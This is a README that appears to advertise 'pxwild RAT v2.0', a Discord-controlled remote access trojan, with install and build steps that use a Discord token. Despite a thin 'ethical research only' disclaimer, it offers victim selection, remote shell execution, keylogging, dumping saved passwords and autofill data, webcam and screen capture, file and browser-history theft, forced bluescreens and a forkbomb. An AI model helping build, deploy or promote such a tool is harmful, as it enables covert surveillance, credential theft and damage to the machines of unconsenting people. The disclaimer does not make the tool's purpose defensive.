# pxwild RAT

[![pxwild](https://files.catbox.moe/nk9lsh.gif)](https://pxwild.com)  
**Ethical Research Tool Only** – For authorized cybersecurity research. Do not use without explicit consent. Owner: [pxwild](https://pxwild.com)

## Overview
pxwild RAT v2.0 is a prototype for ethical red teaming and security research. Use in isolated labs/VMs only. Complies with laws when used responsibly.

## Installation
1. Download the repository files.
2. Install deps: `pip install -r requirements.txt`
3. Build: Run `python builder.py` with your Discord token/channel.

![Cyber Research Banner](https://files.catbox.moe/0hdxk1.png)  
*Prototype interface for ethical testing (research use only).*

## Features

### System Access
- `!connect`: Show all available targets
- `!1, !2, !3`: Connect to any target number
- `!disconnect`: Disconnect from current target
- `!startup`: List startup programs
- `!execute <command>`: Run shell command
- `!cd <directory>`: Change directory
- `!processes`: List running processes
- `!processkill <pid>`: Kill a process by PID
- `!restart`: Restart the system
- `!keylog`: Start Keylogger (NEW)
- `!stoplog`: Stop Keylogger (NEW)

### IP Information
- `!ip`: Get public IP info
- `!sysinfo`: Get system info

### Troll Access
- `!open <link>`: Open a web browser
- `!bsod`: Trigger bluescreen
- `!msgbox <text>`: Show message box
- `!wallpaper <url>`: Set wallpaper (attach image)
- `!forkbomb`: Rabbit Virus

### Device Access
- `!screenshot`: Take a screenshot
- `!webcam`: Capture webcam image

### Credential Dump
- `!password`: Dump saved passwords
- `!autofill`: Dump saved autofill data
- `!accounts`: Detect owned accounts
- `!all`: All accounts & passwords

### New Features
- `!gallery`: Zip and send all screenshots
- `!downloads`: Show Downloads folder contents
- `!pullfile <filename>`: Search and send specific file
- `!browserhistory`: Last 20 sites from all browsers

**Warning**: For ethical research only. pxwild not liable for misuse. Visit [pxwild.com](https://pxwild.com) for support.
